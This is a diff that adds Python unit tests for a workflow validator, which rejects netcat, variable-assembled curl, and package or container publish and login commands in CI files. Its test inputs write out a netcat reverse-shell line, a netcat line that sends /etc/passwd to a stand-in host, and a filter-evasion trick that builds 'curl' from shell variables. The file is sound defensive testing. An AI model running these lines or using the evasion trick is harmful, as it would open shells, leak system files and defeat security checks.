@@ -528,5 +528,265 @@ jobs:
         self.assertEqual(violations, [])
 
 
+# --- issue #9 residual-hardening: fresh-verifier-reproduced gaps -----------
+# Every probe below encodes one of the four concrete residual gaps a
+# fresh, independent verifier reproduced (bare `nc`, character-level
+# shell-variable command assembly, npm/yarn/pnpm publish, docker
+# push/login), plus negative controls proving the real workflow and
+# ordinary, safe shell idioms remain completely clean.
+
+class BareNetcatTests(unittest.TestCase):
+    """A fresh, independent verifier reproduced a bare `nc host port`
+    invocation (no leading `-` flag at all) surviving the previous
+    dash-flag-only pattern (which required a `-` immediately after `nc`)."""
+
+    def test_bare_nc_invocation_rejected(self):
+        text = GOOD_WORKFLOW + "\n      - run: nc example.invalid 4444\n"
+        violations = wg.validate_workflow_text(text)
+        self.assertTrue(any("'nc'" in v for v in violations), violations)
+
+    def test_bare_nc_with_redirection_rejected(self):
+        text = GOOD_WORKFLOW + "\n      - run: nc example.invalid 4444 < /etc/passwd\n"
+        violations = wg.validate_workflow_text(text)
+        self.assertTrue(any("'nc'" in v for v in violations), violations)
+
+    def test_flagged_nc_invocation_still_rejected(self):
+        """Pre-existing coverage, retained: a flagged invocation must
+        remain rejected too -- never weakened by the bare-invocation
+        fix."""
+        text = GOOD_WORKFLOW + "\n      - run: nc -e /bin/sh example.invalid 4444\n"
+        violations = wg.validate_workflow_text(text)
+        self.assertTrue(any("'nc'" in v for v in violations), violations)
+
+    def test_nc_case_insensitive_rejected(self):
+        text = GOOD_WORKFLOW + "\n      - run: NC example.invalid 4444\n"
+        violations = wg.validate_workflow_text(text)
+        self.assertTrue(any("'nc'" in v.lower() for v in violations), violations)
+
+    def test_nc_extra_spacing_rejected(self):
+        text = GOOD_WORKFLOW + "\n      - run: nc    example.invalid   4444\n"
+        violations = wg.validate_workflow_text(text)
+        self.assertTrue(any("'nc'" in v for v in violations), violations)
+
+    def test_ncat_still_rejected(self):
+        text = GOOD_WORKFLOW + "\n      - run: ncat example.invalid 4444\n"
+        violations = wg.validate_workflow_text(text)
+        self.assertTrue(any("ncat" in v for v in violations), violations)
+
+    def test_nc_substring_inside_other_identifiers_not_falsely_rejected(self):
+        """`\\bnc\\b` must not fire merely because "nc" appears glued
+        inside a larger, unrelated word -- the exact substring false
+        positive issue #9 requires this to avoid."""
+        text = GOOD_WORKFLOW + "\n      - run: echo sync async func runc concurrency finance\n"
+        violations = wg.validate_workflow_text(text)
+        self.assertFalse(any("'nc'" in v for v in violations), violations)
+
+
+class PackageAndContainerRegistryPublishTests(unittest.TestCase):
+    """Package-registry publish and container-registry push/login
+    commands, reproduced by a fresh, independent verifier as
+    unrejected."""
+
+    def test_npm_publish_rejected(self):
+        text = GOOD_WORKFLOW + "\n      - run: npm publish\n"
+        violations = wg.validate_workflow_text(text)
+        self.assertTrue(any("npm publish" in v.lower() for v in violations), violations)
+
+    def test_npm_publish_case_insensitive_rejected(self):
+        text = GOOD_WORKFLOW + "\n      - run: Npm Publish\n"
+        violations = wg.validate_workflow_text(text)
+        self.assertTrue(any("npm publish" in v.lower() for v in violations), violations)
+
+    def test_yarn_publish_rejected(self):
+        text = GOOD_WORKFLOW + "\n      - run: yarn publish --non-interactive\n"
+        violations = wg.validate_workflow_text(text)
+        self.assertTrue(any("yarn publish" in v.lower() for v in violations), violations)
+
+    def test_pnpm_publish_rejected(self):
+        text = GOOD_WORKFLOW + "\n      - run: pnpm publish --no-git-checks\n"
+        violations = wg.validate_workflow_text(text)
+        self.assertTrue(any("pnpm publish" in v.lower() for v in violations), violations)
+
+    def test_docker_push_rejected(self):
+        text = GOOD_WORKFLOW + "\n      - run: docker push example.invalid/image:latest\n"
+        violations = wg.validate_workflow_text(text)
+        self.assertTrue(any("docker push" in v.lower() for v in violations), violations)
+
+    def test_docker_image_push_rejected(self):
+        text = GOOD_WORKFLOW + "\n      - run: docker image push example.invalid/image:latest\n"
+        violations = wg.validate_workflow_text(text)
+        self.assertTrue(any("docker push" in v.lower() for v in violations), violations)
+
+    def test_docker_login_rejected(self):
+        text = GOOD_WORKFLOW + "\n      - run: docker login -u user -p pass example.invalid\n"
+        violations = wg.validate_workflow_text(text)
+        self.assertTrue(any("docker login" in v.lower() for v in violations), violations)
+
+    def test_docker_login_case_insensitive_rejected(self):
+        text = GOOD_WORKFLOW + "\n      - run: Docker Login example.invalid\n"
+        violations = wg.validate_workflow_text(text)
+        self.assertTrue(any("docker login" in v.lower() for v in violations), violations)
+
+    def test_non_publishing_commands_not_rejected_by_the_publish_login_rules(self):
+        """A plain, non-publishing npm/yarn/pnpm/docker command must not
+        be flagged by these publish/login-specific rules."""
+        text = "npm install\nyarn add left-pad\npnpm install\ndocker build -t x .\ndocker pull x\n"
+        for pattern, label in wg._COMPILED_FORBIDDEN_PATTERNS:
+            if "publish" in label or "docker login" in label:
+                self.assertIsNone(pattern.search(text), (label, pattern.pattern))
+
+
+class VariableCommandAssemblyTests(unittest.TestCase):
+    """A fresh, independent verifier reproduced a dangerous command name
+    assembled at runtime from concatenated shell variable expansions in
+    command position (`X=cur; Y=l; $X$Y ...`), evading every literal-
+    substring `FORBIDDEN_PATTERNS` check above since the literal command
+    name never appears anywhere in the workflow text."""
+
+    def test_literal_issue_example_bare_concatenation_rejected(self):
+        text = GOOD_WORKFLOW + "\n      - run: X=cur; Y=l; $X$Y https://example.invalid\n"
+        violations = wg.validate_workflow_text(text)
+        self.assertTrue(any("concatenating 2+ shell variable" in v for v in violations), violations)
+
+    def test_braced_concatenation_rejected(self):
+        text = (
+            GOOD_WORKFLOW
+            + "      - run: |\n"
+            + "          X=cur\n"
+            + "          Y=l\n"
+            + "          ${X}${Y} https://example.invalid\n"
+        )
+        violations = wg.validate_workflow_text(text)
+        self.assertTrue(any("concatenating 2+ shell variable" in v for v in violations), violations)
+
+    def test_mixed_brace_and_bare_concatenation_rejected(self):
+        text = (
+            GOOD_WORKFLOW
+            + "      - run: |\n"
+            + "          X=cur\n"
+            + "          Y=l\n"
+            + "          $X${Y} https://example.invalid\n"
+        )
+        violations = wg.validate_workflow_text(text)
+        self.assertTrue(any("concatenating 2+ shell variable" in v for v in violations), violations)
+
+    def test_three_fragment_concatenation_rejected(self):
+        text = (
+            GOOD_WORKFLOW
+            + "      - run: |\n"
+            + "          X=c\n"
+            + "          Y=u\n"
+            + "          Z=rl\n"
+            + "          $X$Y$Z https://example.invalid\n"
+        )
+        violations = wg.validate_workflow_text(text)
+        self.assertTrue(any("concatenating 2+ shell variable" in v for v in violations), violations)
+
+    def test_uppercase_and_extra_spacing_variant_rejected(self):
+        text = GOOD_WORKFLOW + "\n      - run: X=CUR;    Y=L;   $X$Y https://example.invalid\n"
+        violations = wg.validate_workflow_text(text)
+        self.assertTrue(any("concatenating 2+ shell variable" in v for v in violations), violations)
+
+    def test_concatenation_split_across_a_line_continuation_rejected(self):
+        """The concatenation must still be detected once a shell
+        line-continuation splitting it across two YAML lines has
+        already been collapsed by `_normalize_for_scanning`."""
+        text = (
+            GOOD_WORKFLOW
+            + "      - run: |\n"
+            + "          X=cur; Y=l; $X\\\n"
+            + "          $Y https://example.invalid\n"
+        )
+        violations = wg.validate_workflow_text(text)
+        self.assertTrue(any("concatenating 2+ shell variable" in v for v in violations), violations)
+
+    def test_crlf_concatenation_rejected(self):
+        text = (
+            GOOD_WORKFLOW.replace("\n", "\r\n")
+            + "      - run: |\r\n"
+            + "          X=cur; Y=l; $X$Y https://example.invalid\r\n"
+        )
+        violations = wg.validate_workflow_text(text)
+        self.assertTrue(any("concatenating 2+ shell variable" in v for v in violations), violations)
+
+    def test_direct_variable_command_invocation_rejected(self):
+        """A single variable, assigned a full literal command name and
+        then invoked directly (no fragment assembly needed), is the
+        'analogous direct variable command invocation' issue #9 also
+        requires rejected."""
+        text = (
+            GOOD_WORKFLOW
+            + "      - run: |\n"
+            + "          CMD=curl\n"
+            + "          $CMD https://example.invalid\n"
+        )
+        violations = wg.validate_workflow_text(text)
+        self.assertTrue(any("locally assigned a literal value" in v for v in violations), violations)
+
+    def test_direct_variable_command_invocation_braced_rejected(self):
+        text = (
+            GOOD_WORKFLOW
+            + "      - run: |\n"
+            + "          CMD=curl\n"
+            + "          ${CMD} https://example.invalid\n"
+        )
+        violations = wg.validate_workflow_text(text)
+        self.assertTrue(any("locally assigned a literal value" in v for v in violations), violations)
+
+    def test_direct_variable_command_invocation_on_one_line_rejected(self):
+        text = GOOD_WORKFLOW + "\n      - run: CMD=curl; $CMD https://example.invalid\n"
+        violations = wg.validate_workflow_text(text)
+        self.assertTrue(any("locally assigned a literal value" in v for v in violations), violations)
+
+    # --- negative controls: must never break the real, legitimate shape ---
+
+    def test_safe_dynamic_summary_redirection_not_flagged(self):
+        text = (
+            GOOD_WORKFLOW
+            + '      - run: python3 -m scripts.release_rehearsal.cli summary >> "$GITHUB_STEP_SUMMARY"\n'
+        )
+        violations = wg.validate_workflow_text(text)
+        self.assertEqual(violations, [])
+
+    def test_ordinary_non_command_variable_interpolation_not_flagged(self):
+        """Two variables concatenated purely as *displayed data* --
+        never in command position -- must not be flagged: this is the
+        'ordinary non-command data interpolation' issue #9 requires to
+        keep working."""
+        text = GOOD_WORKFLOW + '\n      - run: echo "combined=$A$B"\n'
+        violations = wg.validate_workflow_text(text)
+        self.assertEqual(violations, [])
+
+    def test_env_prefixed_real_command_not_misclassified_as_assignment(self):
+        """The common, legitimate `FOO=bar some-command args` inline-
+        env-var-prefix idiom must not itself be (mis)treated as a 'pure'
+        local assignment that would then make an unrelated later
+        command invocation of some other, differently-named variable
+        suspicious."""
+        text = GOOD_WORKFLOW + "\n      - run: FOO=bar make release-check\n"
+        violations = wg.validate_workflow_text(text)
+        self.assertEqual(violations, [])
+
+    def test_single_never_locally_assigned_variable_command_not_flagged(self):
+        """A single `$VAR` used directly as a command, when `VAR` was
+        never locally assigned anywhere in this same script (e.g. an
+        inherited/ambient environment variable), is not, by itself,
+        high-confidence evidence of evasion -- only a *locally assigned*
+        variable later invoked as a command is."""
+        text = GOOD_WORKFLOW + "\n      - run: $SHELL --version\n"
+        violations = wg.validate_workflow_text(text)
+        self.assertEqual(violations, [])
+
+    def test_real_workflow_remains_clean(self):
+        path = ROOT / ".github" / "workflows" / "release-rehearsal.yml"
+        violations = wg.check_variable_command_assembly(path.read_text(encoding="utf-8"))
+        self.assertEqual(violations, [])
+
+    def test_real_workflow_full_validation_remains_clean(self):
+        path = ROOT / ".github" / "workflows" / "release-rehearsal.yml"
+        violations = wg.validate_workflow_text(path.read_text(encoding="utf-8"))
+        self.assertEqual(violations, [])
+
+
 if __name__ == "__main__":
     unittest.main()
